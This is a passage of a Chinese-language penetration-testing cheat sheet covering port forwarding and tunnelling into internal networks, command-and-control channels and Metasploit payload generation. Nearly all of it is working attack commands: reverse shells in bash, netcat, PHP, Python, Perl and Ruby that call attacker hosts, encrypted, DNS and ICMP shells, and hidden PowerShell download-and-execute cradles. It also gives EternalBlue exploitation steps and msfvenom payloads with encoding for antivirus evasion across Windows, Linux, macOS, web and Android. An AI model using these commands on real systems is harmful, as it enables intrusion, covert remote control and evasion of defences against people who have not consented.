href=\"#-312\">#</a> </h2>\n<h2 id=\"正向转发\"><a class=\"anchor\" href=\"#正向转发\">#</a> 正向转发</h2>\n<pre><code>外网靶机110\n内网靶机115\n本地攻击机编辑后restart ssh服务\n#vim /etc/ssh/sshd_conf\nAllowTcpForwarding yes 允许TCP转发\nGatewayPorts yes   允许远程主机连接本地转发的端口\nTCPKeepAlive yes    TCP会话保持存活\nPasswordAuthentication yes  密码认证\n&gt;ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22\n本地攻击机执行，本地33890转发到远程的3389端口\n上线MSF\n攻击机出网Linux靶机--不出网Linux靶机--不出网win机\n&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe\n攻击机监听端口12345\n不出网Linux机\n&gt;ssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22\n</code></pre>\n<h2 id=\"-313\"><a class=\"anchor\" href=\"#-313\">#</a> </h2>\n<h2 id=\"反向转发\"><a class=\"anchor\" href=\"#反向转发\">#</a> 反向转发</h2>\n<pre><code>外网攻击107\n内网靶机97\n出网靶机编辑后restart ssh服务\n#vim /etc/ssh/sshd_conf\nAllowTcpForwarding yes 允许TCP转发\nGatewayPorts yes   允许远程主机连接本地转发的端口\nTCPKeepAlive yes    TCP会话保持存活\nPasswordAuthentication yes  密码认证\n&gt;ssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22\n出网靶机执行，把外部攻击机33890转发到内部隔离网络的3389\n&gt;netstat –tnlp\n</code></pre>\n<p><img data-src=\"165.png\" alt=\"\" /></p>\n<pre><code>转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)\n&gt;vim /etc/rinetd.conf\n添加0.0.0.0 3389 127.0.0.1 33890\n&gt;service rinetd start\n</code></pre>\n<p><img data-src=\"166.png\" alt=\"\" /></p>\n<pre><code>看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面\n</code></pre>\n<p><img data-src=\"167.png\" alt=\"\" /></p>\n<h3 id=\"invoke-socksproxy\"><a class=\"anchor\" href=\"#invoke-socksproxy\">#</a> Invoke-SocksProxy</h3>\n<pre><code>https://gitee.com/RichChigga/Invoke-SocksProxy\n&gt;Import-Module .\\Invoke-SocksProxy.psm1 \n&gt;Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接\n</code></pre>\n<p><img data-src=\"168.png\" alt=\"\" /><br />\n<img data-src=\"169.png\" alt=\"\" /></p>\n<h3 id=\"ssf\"><a class=\"anchor\" href=\"#ssf\">#</a> SSF</h3>\n<h2 id=\"-314\"><a class=\"anchor\" href=\"#-314\">#</a> </h2>\n<h2 id=\"单层网络正向转发\"><a class=\"anchor\" href=\"#单层网络正向转发\">#</a> 单层网络正向转发</h2>\n<pre><code>https://github.com/securesocketfunneling/ssf/releases\n内网机执行：\n&gt;ssfd.exe -p 1080\n</code></pre>\n<p><img data-src=\"170.png\" alt=\"\" /></p>\n<pre><code>边界机器执行\n&gt;ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 \n把内网10.1.1.108的SSH转发出来\n</code></pre>\n<p><img data-src=\"171.png\" alt=\"\" /></p>\n<pre><code>边界机器访问内网端口\n</code></pre>\n<p><img data-src=\"172.png\" alt=\"\" /></p>\n<h2 id=\"-315\"><a class=\"anchor\" href=\"#-315\">#</a> </h2>\n<h2 id=\"单层网络反向转发\"><a class=\"anchor\" href=\"#单层网络反向转发\">#</a> 单层网络反向转发</h2>\n<pre><code>边界机器执行：\n&gt;ssfd.exe -p 1080\n</code></pre>\n<p><img data-src=\"173.png\" alt=\"\" /></p>\n<pre><code>内网机器执行：\n&gt;ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106\n</code></pre>\n<p><img data-src=\"174.png\" alt=\"\" />\t<br />\n<img data-src=\"175.png\" alt=\"\" /></p>\n<h3 id=\"netsh\"><a class=\"anchor\" href=\"#netsh\">#</a> Netsh</h3>\n<pre><code>边界机器执行：\n&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22\n将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH\n</code></pre>\n<p><img data-src=\"176.png\" alt=\"\" /></p>\n<pre><code>&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389\n当靶机某服务只允许内网访问时，将端口转发出来\n</code></pre>\n<p><img data-src=\"177.png\" alt=\"\" /></p>\n<pre><code>添加防火墙规则：\n&gt;netsh advfirewall firewall add rule name=&quot;RDP&quot; protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow\n列出所有转发规则:\n&gt;netsh interface portproxy show all\n</code></pre>\n<p><img data-src=\"178.png\" alt=\"\" /></p>\n<pre><code>删除指定的端口转发规则：\n&gt;netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98\n删除所有转发规则：\n&gt;netsh interface portproxy reset\n</code></pre>\n<h3 id=\"iptables\"><a class=\"anchor\" href=\"#iptables\">#</a> Iptables</h3>\n<pre><code>需开启ip转发功能\n&gt;vim /etc/sysctl.conf设置net.ipv4.ip_forward=1\n</code></pre>\n<p><img data-src=\"179.png\" alt=\"\" /><br />\n<img data-src=\"180.png\" alt=\"\" /></p>\n<pre><code>本地端口22转发到2222上\n&gt;iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22\n内网98机器3389转到本机110的6789上\n&gt;iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389\n&gt;iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110\n</code></pre>\n<p><img data-src=\"181.png\" alt=\"\" /></p>\n<pre><code>查看规则\n&gt;iptables -t nat -L\n删除规则\n&gt;iptables -t nat -D PREROUTING 1\n删除全部规则\n&gt;iptables -t nat –F\n</code></pre>\n<h3 id=\"chisel\"><a class=\"anchor\" href=\"#chisel\">#</a> chisel</h3>\n<pre><code>https://github.com/jpillora/chisel\n攻击机执行\n&gt;chisel server -p 12138 –reverse\n</code></pre>\n<p><img data-src=\"182.png\" alt=\"\" /></p>\n<pre><code>靶机执行\n&gt;chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389\n</code></pre>\n<p><img data-src=\"183.png\" alt=\"\" /></p>\n<pre><code>建立成功后，攻击机连接本机1234端口即可访问靶机3389\n</code></pre>\n<p><img data-src=\"184.png\" alt=\"\" /></p>\n<h2 id=\"命令控制\"><a class=\"anchor\" href=\"#命令控制\">#</a> 命令 &amp; 控制</h2>\n<h3 id=\"interactive-shell\"><a class=\"anchor\" href=\"#interactive-shell\">#</a> Interactive shell</h3>\n<pre><code>&gt;python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'\n&gt;expect -c 'spawn bash;interact'\n</code></pre>\n<h3 id=\"script-reverse-shell\"><a class=\"anchor\" href=\"#script-reverse-shell\">#</a> Script reverse shell</h3>\n<h2 id=\"-316\"><a class=\"anchor\" href=\"#-316\">#</a> </h2>\n<h2 id=\"bash-2\"><a class=\"anchor\" href=\"#bash-2\">#</a> bash</h2>\n<pre><code>&gt;/bin/bash -i &gt; /dev/tcp/attackerip/4444 0&lt;&amp;1 2&gt;&amp;1\n</code></pre>\n<p><img data-src=\"185.png\" alt=\"\" /></p>\n<pre><code>&gt;bash -i &gt;&amp; /dev/tcp/attackerip/4444 0&gt;&amp;1\n</code></pre>\n<p><img data-src=\"186.png\" alt=\"\" /></p>\n<pre><code>&gt;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196\n</code></pre>\n<p><img data-src=\"187.png\" alt=\"\" /></p>\n<pre><code>&gt;msfvenom -p cmd/unix/reverse_bash LHOST=attackerip LPORT=4444 -o shell.sh\n</code></pre>\n<p><img data-src=\"188.png\" alt=\"\" /></p>\n<h2 id=\"-317\"><a class=\"anchor\" href=\"#-317\">#</a> </h2>\n<h2 id=\"nc\"><a class=\"anchor\" href=\"#nc\">#</a> nc</h2>\n<pre><code>&gt;nc -e /bin/sh attackerip 4444\n&gt;nc -Lp 31337 -vv -e cmd.exe\n&amp;\n&gt;mknod backpipe p; nc 192.168.0.107 12138 0&lt;backpipe | /bin/bash 1&gt;backpipe\n&gt;nc 192.168.0.10 31337\n</code></pre>\n<h2 id=\"-318\"><a class=\"anchor\" href=\"#-318\">#</a> </h2>\n<h2 id=\"telnet\"><a class=\"anchor\" href=\"#telnet\">#</a> telnet</h2>\n<pre><code>&gt;mknod backpipe p; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe\n</code></pre>\n<h2 id=\"-319\"><a class=\"anchor\" href=\"#-319\">#</a> </h2>\n<h2 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> php</h2>\n<pre><code>#php -r '$sock=fsockopen(&quot;IP&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'\n&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.0.107/1234 0&gt;&amp;1'&quot;);?&gt;\n</code></pre>\n<h2 id=\"-320\"><a class=\"anchor\" href=\"#-320\">#</a> </h2>\n<h2 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> python</h2>\n<pre><code>&gt;python -c ' import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]); '\n&gt;msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py\n&gt;import socket,struct,time for x in range(10): try: s=socket.socket(2,socket.SOCK_STREAM) s.connect(('IP',端口)) break except: time.sleep(5) l=struct.unpack('&gt;I',s.recv(4))[0] d=s.recv(l) while len(d)\n</code></pre>\n<h2 id=\"-321\"><a class=\"anchor\" href=\"#-321\">#</a> </h2>\n<h2 id=\"perl\"><a class=\"anchor\" href=\"#perl\">#</a> perl</h2>\n<pre><code>&gt;perl -e 'use Socket;$i=&quot; attackerip &quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;'\n&gt;perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'\n&gt;perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'  \n</code></pre>\n<h2 id=\"-322\"><a class=\"anchor\" href=\"#-322\">#</a> </h2>\n<p>###windows</p>\n<h2 id=\"-323\"><a class=\"anchor\" href=\"#-323\">#</a> </h2>\n<h2 id=\"ruby-2\"><a class=\"anchor\" href=\"#ruby-2\">#</a> ruby</h2>\n<pre><code>&gt;ruby -rsocket -e'f=TCPSocket.open(&quot;attackerip &quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'\n&gt;ruby -rsocket -e 'c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end'   \n</code></pre>\n<h2 id=\"-324\"><a class=\"anchor\" href=\"#-324\">#</a> </h2>\n<p>###windows</p>\n<h3 id=\"openssl-encrypt-shell\"><a class=\"anchor\" href=\"#openssl-encrypt-shell\">#</a> OpenSSL encrypt shell</h3>\n<pre><code>生成证书\n&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes\n</code></pre>\n<p><img data-src=\"189.png\" alt=\"\" /></p>\n<h2 id=\"-325\"><a class=\"anchor\" href=\"#-325\">#</a> </h2>\n<h2 id=\"linux-2\"><a class=\"anchor\" href=\"#linux-2\">#</a> Linux</h2>\n<pre><code>监听\n&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 1337\n</code></pre>\n<p><img data-src=\"190.png\" alt=\"\" /></p>\n<pre><code>靶机执行\n&gt;mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.0.108:1337 &gt; /tmp/s; rm /tmp/s\n</code></pre>\n<p><img data-src=\"191.png\" alt=\"\" /></p>\n<pre><code>此方式使用TLS1.2 协议对通信进行加密\n</code></pre>\n<h2 id=\"-326\"><a class=\"anchor\" href=\"#-326\">#</a> </h2>\n<h2 id=\"windows-2\"><a class=\"anchor\" href=\"#windows-2\">#</a> Windows</h2>\n<pre><code>攻击机需监听2个端口，一个端口发送命令，一个端口接收回显\n发送\n&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 1337\n接收\n&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 1338\n靶机执行\n&gt;openssl s_client -quiet -connect 192.168.0.108:1337|cmd.exe|openssl s_client -quiet -connect 192.168.0.108:1338\n</code></pre>\n<p><img data-src=\"192.png\" alt=\"\" /><br />\n<img data-src=\"193.png\" alt=\"\" /><br />\n<img data-src=\"194.png\" alt=\"\" /></p>\n<h3 id=\"dnscat2\"><a class=\"anchor\" href=\"#dnscat2\">#</a> Dnscat2</h3>\n<pre><code>安装dnscat2\n&gt;apt-get -y install ruby-dev git make g++\n&gt;gem install bundler\n&gt;git clone https://github.com/iagox86/dnscat2.git\n&gt;cd dnscat2/server\n&gt;bundle install\n执行\n&gt;ruby dnscat2.rb abc.com -e open --no-cache\n</code></pre>\n<p><img data-src=\"195.png\" alt=\"\" /></p>\n<h2 id=\"-327\"><a class=\"anchor\" href=\"#-327\">#</a> </h2>\n<h2 id=\"powercat\"><a class=\"anchor\" href=\"#powercat\">#</a> Powercat</h2>\n<pre><code>靶机执行\n&gt;powercat -c 192.168.0.108 -v -dns abc.com -e cmd.exe\n</code></pre>\n<p><img data-src=\"196.png\" alt=\"\" /></p>\n<pre><code>dnscat2执行\n&gt;session -i 1进入会话\n</code></pre>\n<p><img data-src=\"197.png\" alt=\"\" /></p>\n<h2 id=\"-328\"><a class=\"anchor\" href=\"#-328\">#</a> </h2>\n<h2 id=\"dnscat2-exe\"><a class=\"anchor\" href=\"#dnscat2-exe\">#</a> Dnscat2 exe</h2>\n<pre><code>Linux\nhttps://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-x86.tar.bz2 https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-x64.tar.bz2\nhttps://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip\n攻击机执行\n&gt;ruby dnscat2.rb --dns &quot;domain=zone.com,host=192.168.0.108&quot; --no-cache\n靶机执行\n&gt;dnscat2-v0.07-client-win32.exe --dns server=192.168.0.108\n</code></pre>\n<p><img data-src=\"198.png\" alt=\"\" /></p>\n<pre><code>攻击机执行\n&gt;session -i [ID]进入会话\n</code></pre>\n<p><img data-src=\"199.png\" alt=\"\" /><br />\n<img data-src=\"200.png\" alt=\"\" /></p>\n<h3 id=\"dns-txt-command\"><a class=\"anchor\" href=\"#dns-txt-command\">#</a> DNS TXT Command</h3>\n<pre><code>https://github.com/samratashok/nishang/Utility/Out-DnsTxt.ps1\nhttps://github.com/samratashok/nishang/Backdoors/DNS_TXT_Pwnage.ps1\n新建一个psh文件，使用out-dnstxt转换，这里的命令是net user\n</code></pre>\n<p><img data-src=\"201.png\" alt=\"\" /><br />\n<img data-src=\"202.png\" alt=\"\" /></p>\n<pre><code>y0stUSgtTi3i5QIA\n添加一条域名txt记录，这里在本地设置，正常是在域名商的网站里配置\n</code></pre>\n<p><img data-src=\"203.png\" alt=\"\" /></p>\n<pre><code>还需创建两个txt记录，分别是指定开始和结束的字符串\n</code></pre>\n<p><img data-src=\"204.png\" alt=\"\" /><br />\n<img data-src=\"205.png\" alt=\"\" /></p>\n<pre><code>靶机执行\n&gt;Import-Module .\\DNS_TXT_Pwnage.ps1\n&gt;DNS_TXT_Pwnage -startdomain start.zone.com -cmdstring cmd -commanddomain 1.zone.com -psstring start -psdomain zone.com -Subdomains 1 -StopString stop\n</code></pre>\n<p><img data-src=\"206.png\" alt=\"\" /></p>\n<h3 id=\"powershell-2\"><a class=\"anchor\" href=\"#powershell-2\">#</a> Powershell</h3>\n<h2 id=\"-329\"><a class=\"anchor\" href=\"#-329\">#</a> </h2>\n<h2 id=\"msfpowershell\"><a class=\"anchor\" href=\"#msfpowershell\">#</a> MSF+Powershell</h2>\n<pre><code>反弹MSF\n靶机\nPS &gt;IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1') \nPS &gt;Invoke-Shellcode -payload windows/meterpreter/reverse_http -lhost 192.168.0.100 -lport 6666 -force\n攻击机：\n&gt;use exploit/multi/handler\n&gt;set payload windows/x64/meterpreter/reverse_ https\n&gt;run\n或\n&gt;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.100 LPORT=4444 -f powershell -o /var/www/html/ps\n&gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.100/powersploit/CodeExecution/Invoke-Shellcode.ps1&quot;)\n&gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.100/ps&quot;)\n&gt;Invoke-Shellcode -Shellcode ($buf)\n或\n&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f psh-reflection &gt;/var/www/html/a.ps1\n&gt;powershell -nop -w hidden -c &quot;IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.101/a.ps1')&quot;\n</code></pre>\n<h2 id=\"-330\"><a class=\"anchor\" href=\"#-330\">#</a> </h2>\n<h2 id=\"powercat-2\"><a class=\"anchor\" href=\"#powercat-2\">#</a> Powercat</h2>\n<pre><code>&gt;powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')\n正向连接\n靶机:powercat -l -p 8080 -e cmd.exe –v\n攻击机:nc 192.168.0.1 8080 –vv\n反向连接：\n攻击机：nc –l –p 8080 –vv\n靶机:powercat –c 192.168.0.1 –p 8080 –v –e cmd.exe\n远程执行\n&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.0.107/ps/powercat/powercat.ps1'); powercat -c 192.168.0.107 -p 12345 -v -e cmd.exe&quot;\n正向连接\n靶机:powercat -l -p 8080 -e cmd.exe -v\n攻击机:nc 192.168.0.1 8080 -vv\n反向连接：\n攻击机：nc -l -p 8080 -vv\n靶机:powercat -c 192.168.0.1 -p 8080 -v -e cmd.exe\n</code></pre>\n<p><img data-src=\"207.png\" alt=\"\" /></p>\n<h2 id=\"-331\"><a class=\"anchor\" href=\"#-331\">#</a> </h2>\n<h2 id=\"nishang\"><a class=\"anchor\" href=\"#nishang\">#</a> Nishang</h2>\n<h2 id=\"-332\"><a class=\"anchor\" href=\"#-332\">#</a> </h2>\n<h3 id=\"bind-shell\"><a class=\"anchor\" href=\"#bind-shell\">#</a> Bind shell</h3>\n<pre><code>靶机：\n&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Bind -Port 12138&quot;\n攻击机：\n&gt;nc 靶机IP 12138\n</code></pre>\n<h2 id=\"-333\"><a class=\"anchor\" href=\"#-333\">#</a> </h2>\n<h3 id=\"反向shell\"><a class=\"anchor\" href=\"#反向shell\">#</a> 反向 shell</h3>\n<pre><code>攻击机：\n&gt;nc -vnlp 9999\n靶机：\n&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 攻击机IP -port 9999&quot;\n</code></pre>\n<h2 id=\"-334\"><a class=\"anchor\" href=\"#-334\">#</a> </h2>\n<h3 id=\"udp反向shell\"><a class=\"anchor\" href=\"#udp反向shell\">#</a> UDP 反向 shell</h3>\n<pre><code>攻击机：\n&gt;nc -lvup 12138\n靶机：\n&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 攻击机IP -port 12138&quot;\n</code></pre>\n<h2 id=\"-335\"><a class=\"anchor\" href=\"#-335\">#</a> </h2>\n<h3 id=\"https\"><a class=\"anchor\" href=\"#https\">#</a> HTTPS</h3>\n<pre><code>攻击机：\n&gt;powershell -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PoshRatHttps.ps1'); Invoke-PoshRatHttps -IPAddress 192.168.0.98 -Port 8080 -SSLPort 443&quot;  IP地址是本机IP\n</code></pre>\n<p><img data-src=\"208.png\" alt=\"\" /></p>\n<pre><code>靶机：\n&gt;powershell -w hidden -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.98:8080/connect')\n</code></pre>\n<p><img data-src=\"209.png\" alt=\"\" /></p>\n<h2 id=\"-336\"><a class=\"anchor\" href=\"#-336\">#</a> </h2>\n<h3 id=\"icmp\"><a class=\"anchor\" href=\"#icmp\">#</a> ICMP</h3>\n<pre><code>攻击机IP:108\n靶机IP:100\nhttps://github.com/inquisb/icmpsh\n靶机执行\n&gt;powershell -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.108/ps/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp 192.168.0.108\n</code></pre>\n<p><img data-src=\"210.png\" alt=\"\" /></p>\n<pre><code>攻击机执行，开启相应ICMP ECHO请求\n&gt;sysctl -w net.ipv4.icmp_echo_ignore_all=1\n&gt;./icmpsh_m.py 192.168.0.108 192.168.0.100\n</code></pre>\n<p><img data-src=\"211.png\" alt=\"\" /></p>\n<h2 id=\"-337\"><a class=\"anchor\" href=\"#-337\">#</a> </h2>\n<h2 id=\"base64-3\"><a class=\"anchor\" href=\"#base64-3\">#</a> Base64</h2>\n<pre><code>&gt;Powershell &quot;$string=&quot;net user&quot;;[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($string))&quot;\n</code></pre>\n<h3 id=\"metasploit\"><a class=\"anchor\" href=\"#metasploit\">#</a> Metasploit</h3>\n<h2 id=\"-338\"><a class=\"anchor\" href=\"#-338\">#</a> </h2>\n<h2 id=\"常规使用\"><a class=\"anchor\" href=\"#常规使用\">#</a> 常规使用</h2>\n<pre><code>#systemctl start postgresql.service 启动数据库服务\n#msfdb init 初始化数据库\n#msfconsole进入MSF框架\n#search  ms17-010 查找攻击模块\n#use exploit/windows/smb/ms17_010_eternalblue 使用模块 \n#set payload windows/x64/meterpreter/reverse_tcp 设置载荷\n#info 查看信息\n#show options查看需要设置的参数\n#set RHOST 192.168.125.138设置参数\n#exploit 执行攻击模块\n#back 回退\n</code></pre>\n<h2 id=\"-339\"><a class=\"anchor\" href=\"#-339\">#</a> </h2>\n<h2 id=\"技巧使用\"><a class=\"anchor\" href=\"#技巧使用\">#</a> 技巧使用</h2>\n<pre><code>#handler -H 192.168.0.10 -P 3333 -p windows/x64/meterpreter/reverse_tcp快速监听\n#setg 设置全局参数\n#set autorunscript migrate –f 自动迁移进程\n#set autorunscript migrate -n explorer.exe\n#set AutoRunScript post/windows/manage/migrate\n#set prependmigrate true 自动注入进程\n#set prependmigrateProc svchost.exe\n#set exitonsession false获取到session后继续监听，获得多个session\n#set stagerverifysslcert false 防止出现ssl错误\n#set SessionCommunicationTimeout 0 防止session超时退出\n#set SessionExpirationTimeout 0 防止强制关闭session\n#exploit -j -z  后台持续监听\n&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -e x86/shikata_ga_nai -b &quot;x00&quot; -i 5 -a x86 --platform windows PrependMigrate=true PrependMigrateProc=explorer.exe -f exe -o  1.exe 执行后注入到已存在的一个进程\n&gt;set EnableStageEncoding true\n&gt;set stageencoder x86/fnstenv_mov 编码进行免杀\n&gt;set stageencodingfallback false\n</code></pre>\n<h2 id=\"-340\"><a class=\"anchor\" href=\"#-340\">#</a> </h2>\n<h2 id=\"模块\"><a class=\"anchor\" href=\"#模块\">#</a> 模块</h2>\n<h2 id=\"-341\"><a class=\"anchor\" href=\"#-341\">#</a> </h2>\n<h3 id=\"auxiliary\"><a class=\"anchor\" href=\"#auxiliary\">#</a> Auxiliary</h3>\n<pre><code>#show auxiliary 查看所有模块\n</code></pre>\n<h2 id=\"-342\"><a class=\"anchor\" href=\"#-342\">#</a> </h2>\n<h3 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> Payload</h3>\n<pre><code>#show payloads 查看所有攻击载荷\nPayload是目标被攻击时执行的实际功能代码\n生成载荷\n#use exploit/multi/script/web_delivery\n&gt;set target 2\n&gt;msfvenom --list payloads 列出所有payload\n&gt;msfvenom --list encoders 列出所有编码器\n</code></pre>\n<h2 id=\"-343\"><a class=\"anchor\" href=\"#-343\">#</a> </h2>\n<h2 id=\"-344\"><a class=\"anchor\" href=\"#-344\">#</a> </h2>\n<h2 id=\"windows-3\"><a class=\"anchor\" href=\"#windows-3\">#</a> Windows</h2>\n<pre><code>#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f exe -o /root/1.exe\n#msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 3 -f exe -o 1.exe\n#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f psh-reflection &gt;xxx.ps1\n#msfvenom -a x64 --platform windows -p windows/powershell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1\n&gt;msfvenom -p windows/shell_hidden_bind_tcp LHOST=192.168.0.1 LPORT=11111  -f exe&gt; /root/1.exe  生成NC正向连接\n&gt;msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f exe&gt; 1.exe 生成NC反向连接\n</code></pre>\n<h2 id=\"-345\"><a class=\"anchor\" href=\"#-345\">#</a> </h2>\n<h2 id=\"-346\"><a class=\"anchor\" href=\"#-346\">#</a> </h2>\n<h2 id=\"linux-3\"><a class=\"anchor\" href=\"#linux-3\">#</a> Linux</h2>\n<pre><code>#msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -e -f elf -a x86 --platform linux -o shell\n#msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.1 LPORT=11111 -f raw &gt; shell.sh\n</code></pre>\n<h2 id=\"-347\"><a class=\"anchor\" href=\"#-347\">#</a> </h2>\n<h2 id=\"-348\"><a class=\"anchor\" href=\"#-348\">#</a> </h2>\n<h2 id=\"macos\"><a class=\"anchor\" href=\"#macos\">#</a> MacOS</h2>\n<pre><code>#msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f macho &gt; shell.macho\n</code></pre>\n<h2 id=\"-349\"><a class=\"anchor\" href=\"#-349\">#</a> </h2>\n<h2 id=\"-350\"><a class=\"anchor\" href=\"#-350\">#</a> </h2>\n<h2 id=\"web-2\"><a class=\"anchor\" href=\"#web-2\">#</a> Web</h2>\n<pre><code>#msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw &gt; shell.php\n#msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f war &gt; shell.war\n#msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f aspx -o payload.aspx\n#msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f raw -o payload.jsp\n#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f asp &gt; shell.asp\n</code></pre>\n<h2 id=\"-351\"><a class=\"anchor\" href=\"#-351\">#</a> </h2>\n<h2 id=\"-352\"><a class=\"anchor\" href=\"#-352\">#</a> </h2>\n<h2 id=\"android\"><a class=\"anchor\" href=\"#android\">#</a> Android</h2>\n<pre><code>#msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=11111 -f apk -o payload.apk\n#msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12138 -f raw &gt; shell.apk\n#msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=12138 R &gt; test.apk\n</code></pre>\n<h2 id=\"-353\"><a class=\"anchor\" href=\"#-353\">#</a> </h2>\n<h2 id=\"-354\"><a class=\"anchor\" href=\"#-354\">#</a> </h2>\n<h2 